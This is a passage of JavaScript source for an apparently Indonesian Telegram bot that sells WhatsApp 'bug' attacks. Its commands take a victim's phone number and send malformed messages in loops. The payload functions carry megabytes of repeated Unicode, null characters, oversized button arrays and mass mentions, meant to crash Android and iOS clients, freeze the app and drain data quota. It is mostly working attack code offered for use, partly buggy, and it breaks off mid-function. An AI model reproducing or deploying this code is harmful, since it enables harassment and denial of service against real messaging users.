            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote><strong>𝚅𝚄𝚂𝙴𝚄 𝚇-𝚁𝙰𝚈 𝚂𝙿𝙰𝙼</strong></blockquote>
↯ Developer : @LoxNex<tg-emoji emoji-id="5778220576497735613">⚜️</tg-emoji>
↯ Version : 15.0 Murbug
↯ Prefix : /
↯ Type : Bebas Spam Bug
↯ Fitur : Auto Update
<blockquote><strong>𝙰𝙽𝙳𝚁𝙾𝙸𝙳/𝙸𝙾𝚂 𝙱𝚄𝙶𝚂</strong></blockquote>
↯ /Forclose - Forclose Spam
↯ /Bulldozer - Sedot Kouta Spam
↯ /DelayInvis - Delay Invisible Spam
↯ /BlankBeta - Blank Hard Spam
↯ /CrashUi - Crash Andro Spam
<blockquote><strong>𝙸𝙾𝚂 𝙱𝚄𝙶𝚂</strong></blockquote>
↯ /CrashIos - Crash Ios Spam`;

    const keyboard = [
        [
            { text: "BACK", callback_data: "/start", style: "Primary", icon_custom_emoji_id: "5893203503915996356" },
            { text: "CHANNEL", url: "https://t.me/AboutKingZurrx", style: "Success", icon_custom_emoji_id: "5893494861612455015" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action("verify_join", async (ctx) => {
  const joined = await checkJoin(ctx.from.id);

  if (!joined) {
    return ctx.answerCbQuery(
      "❌ Kamu belum join channel",
      { show_alert: true }
    );
  }

  await ctx.answerCbQuery("✅ Verifikasi berhasil");

  try {
    await ctx.deleteMessage();
  } catch {}

  return ctx.reply(
    "✅ Berhasil diverifikasi.\nSilakan ketik /start"
  );
});

// CASE BUG
bot.command("Forclose", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /Forclose 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ Forclose (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 79; i++) {
    await Xvisible(target);
    await sleep(2500);
    await xrlpay(target);
    await sleep(2500);
    
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 Forclose dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("Bulldozer", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /Bulldozer 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ Bulldozer (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 15; i++) {
    await BulldozerQuota(target);
    await sleep(1500);
    await DelayKelrax(target);
    await sleep(1500);
    
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 Bulldozer dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("DelayInvis", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /DelayInvis 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ DelayInvis (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 71; i++) {
    await native(sock, target);
    await sleep(2500);
    await nativeUi;
    await sleep(2500);
    
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 DelayInvis dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("BlankBeta", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /BlankBeta 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ BlankBeta (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 73; i++) {
    await BlankPou(sock, target);
    await sleep(2500);
    await blankmonas(sock, target);
    await sleep(2500);
    
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 BlankBeta dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("CrashUi", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /CrashUi 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ CrashUi (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 84; i++) {
    await CrashMsg(target);
    await sleep(3500);
    await XStromCrashDocu(target);
    await sleep(3500);
    await crashnoclick(sock, target);
    await sleep(3500);
    
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 CrashUi dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("CrashIos", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /CrashIos 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ CrashIos (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 81; i++) {
    await IosInvis(target);
    await sleep(3500);
    await iosv2(target);
    await sleep(3500);
    
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 CrashIos dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

// FUNCTION BUG DISINI
async function Xvisible(target) {
  for (let i = 0; i < 65; i++) {
    await client.relayMessage(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(1045000),
                version: 3,
              },
            },
          },
        },
      },
      { participant: { jid: target } }
    );
  }

  await client.relayMessage(
    target,
    {
      newsletterAdminInviteMessage: {
        newsletterJid: "1@newsletter",
        newsletterName: "X" + "ោ៝".repeat(9999),
        caption: "v3rs3 Kill Yu" + "ꦾ".repeat(60000),
        inviteExpiration: "999999999",
      },
    },
    {}
  );

  await sock.relayMessage(target, content.message, {});
}

async function xrlpay(target) {
  await sock.relayMessage(
    target,
    {
      requestPaymentMessage: {
        currencyCodeIso4217: "USD",
        amount1000: 99 * 99,
        requestFrom: target,
        noteMessage: {
          extendedTextMessage: {
            text: "⟅ ༑ ▾𝐀‌𝐒‌𝐓‌𝐑‌𝐎‌𝐓‌𝐇🦠𝐗‌-𝐑‌𝐀‌𝐘⟅ ༑ ▾",
          },
        },
        expiryTimestamp: Date.now() + 86400000,
      },
    },
    {
      participant: { jid: target }
    }
  );
}

async function BulldozerQuota(target) {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\u0000" },
              nativeFlowMessage: {
                messageParamsJson: "{}".repeat(10000),
              },
              contextInfo: {
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: Array.from(
                  { length: 42000 },
                  () => `37${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
              }
            }
          }
        }
      },
      {}
    );
    await client.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
}

async function DelayKelrax(target) {
  const stikerMessage = {
    groupStatusMessageV2: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          fileLength: "10610",
          mediaKeyTimestamp: "1775044724",
          stickerSentTs: "1775044724091",

          contextInfo: {
            externalAdReply: {
              title: " kelra - execute " + "𑜦࣯".repeat(100000),
              body: " kelra - execute " + "𑜦࣯".repeat(100000),
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
              thumbnail:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k="
            },

            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [
                  {
                    jid: "0@s.whatsapp.net",
                    callOutcome: "1"
                  }
                ]
              }
            },

            quotedAd: {
              advertiserName: "Trickest",
              mediaType: "IMAGE",
              jpegThumbnail:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8Q=",
              caption: "\0"
            },

            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },

            forwardingScore: 99999999,
            isForwarded: true,

            conversionSource: "source_example",
            conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
            conversionDelaySeconds: 10
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, stikerMessage, {});

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    {
      messageId: msg.key.id,
      participant: { jid: target }
    }
  );
}

async function native(sock, target) {
    const nativePayload = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: `{\"values\":{\"in_pin_code\":\"9999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                        version: 3,
                    },
                    entryPointConversionSource: "{}"
                },
                contextInfo: {
                    stanzaId: target,
                    participant: target,
                    mentionedJid: Array.from(
                        { length: 1900 },
                        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        },
                    },
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(target, nativePayload, {});
    
    await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: { jid: target }
    });
    
    console.log(chalk.green(`Native Bug Sent to ${target}`));
}

async function nativeUi(sock, target) {
  const xts = 9999;
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " #x3nox! ",
              hasMediaAttachment: false,
            },
            body: {
              text: "".repeat(85000000),
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: "ꦽ".repeat(xts),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(xts),
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(
    target,
    msg.message,
    ptcp ? { participant: { jid: target } } : {}
  );
  console.log(chalk.green("Send Bug By Wazz"));
}

async function BlankPou(sock, target) {
  await sock.relayMessage(target, {
    locationMessage: {
      degreesLongitude: 0,
      degreesLatitude: 0,
      name: "🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰" + "ི꒦ྀ".repeat(9990),
      url: "ི꒦ྀ".repeat(9990),
      address: "ི꒦ྀ".repeat(9990),
      contextInfo: {
        externalAdReply: {
          renderLargerThumbnail: true,
          showAdAttribution: true,
          body: "🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰",
          title: "ི꒦ྀ".repeat(9990),
          sourceUrl: "https://." + "ི꒦ྀ".repeat(9990) + ".id",
          thumbnailUrl: null,
          quotedAd: {
            advertiserName: "ི꒦ྀ".repeat(9990),
            mediaType: 2,
            jpegThumbnail: "/9j/4AAKossjsls7920ljspLli",
            caption: "🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰"
          },
          pleaceKeyHolder: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCD1234567"
          },
          newsletterAdminInviteMessage: {
            newsletterJid: "120363319314627296@newsletter",
            inviteCode: "ཹ".repeat(130000),
            inviteExpiration: 999999999,
            newsletterName: "ཹ" + "ཹ".repeat(110000),
            body: {
              text: "🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰" + "ោ៝".repeat(60000)
            }
          }
        }
      }
    }
  }, {});
}

async function blankmonas(sock, target) {
    for (let i = 0; i < 1111; i++) {
        const msg = {
            interactiveMessage: {
                nativeFlowMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            displayText: "\u0000".repeat(500000) + "ཹ".repeat(450000),
                            id: "\u202E".repeat(25000),
                        })
                    }))
                }
            }
        };
        
        await sock.relayMessage(target, msg, {
            participant: { jid: target }
        });
        
    }
}
 
async function XStromCrashDocu(target) {
  const biji = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦾ".repeat(1000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999",
              pageCount: 9007199254740991,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "⌁⃰𝘽𝙤𝙨𝙨𝙒𝙖𝙯𝙯ཀ",
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: false,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰͡" + "ោ៝".repeat(5470),
          },
          contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
               },
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/AngelOfDarkNexx",
                    unconsentedUsersUrl: "https://t.me/AngelOfDarkNexx",
                    consentedUsersUrl: "https://t.me/AngelOfDarkNexx",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/AngelOfDarkNexx",
                    unconsentedUsersUrl: "https://t.me/AngelOfDarkNexx",
                    consentedUsersUrl: "https://t.me/AngelOfDarkNexx",
                    cardIndex: 2,
                  },
                ],
              },
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            messageVersion: 3,
            buttons: [
                {
                  name: "cta_call",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                 },
               {
                 name: "cta_url",
                 buttonParamsJson: "",
               },
                {
                  name: "galaxy_message",
                  buttonParamsJson: `{ icon: 'DOCUMENT' }`,
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{ 'consencutive': true }",
                },
              ],
            },
          },
        },
      },
    };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(biji), { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  console.log(chalk.red(`Boss Wazz Succes Sending Bug!!!`));
}
 
async function crashnoclick(sock, target) {
    try {
        const video = {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1"
        };

        const message = {
            groupStatusMesaggeV2: {
                message: {
                    stickerMessage: video,
                    contextInfo: {
                        quotedMessage: {
                            stickerMessage: {
                                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "video/mp4",
                                mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                                fileLength: "9999999999",
                                directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                                fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                                fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                                mediaKeyTimestamp: "1775044724",
                                stickerSentTs: "1775044724091"
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, message, {
            messageId: sock.generateMessageTag()
        });

        console.log("Succes Sent");
    } catch (err) {
        console.error("Error:", err);
    }
}

async function CrashMsg(client, target) {
    try {
    
        const buttons = [];
        for (let i = 0; i < 5; i++) {
            buttons.push({
                buttonId: `btn_${i}`,
                buttonText: { displayText: "𑇂𑆵𑆴𑆿".repeat(200) + "ꦽ".repeat(200) },
                type: 1
            });
        }
        
        const msg1 = {
            text: "Queen Mia Otw Bantai Kacunk\n" + "ꦾ".repeat(5000) + "\u0000".repeat(3000),
            footer: "ោ៝" + "ꦾ".repeat(2000),
            buttons: buttons,
            headerType: 6,
            viewOnce: true,
            contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                externalAdReply: {
                    title: "𓆩᬴𓆪".repeat(1000),
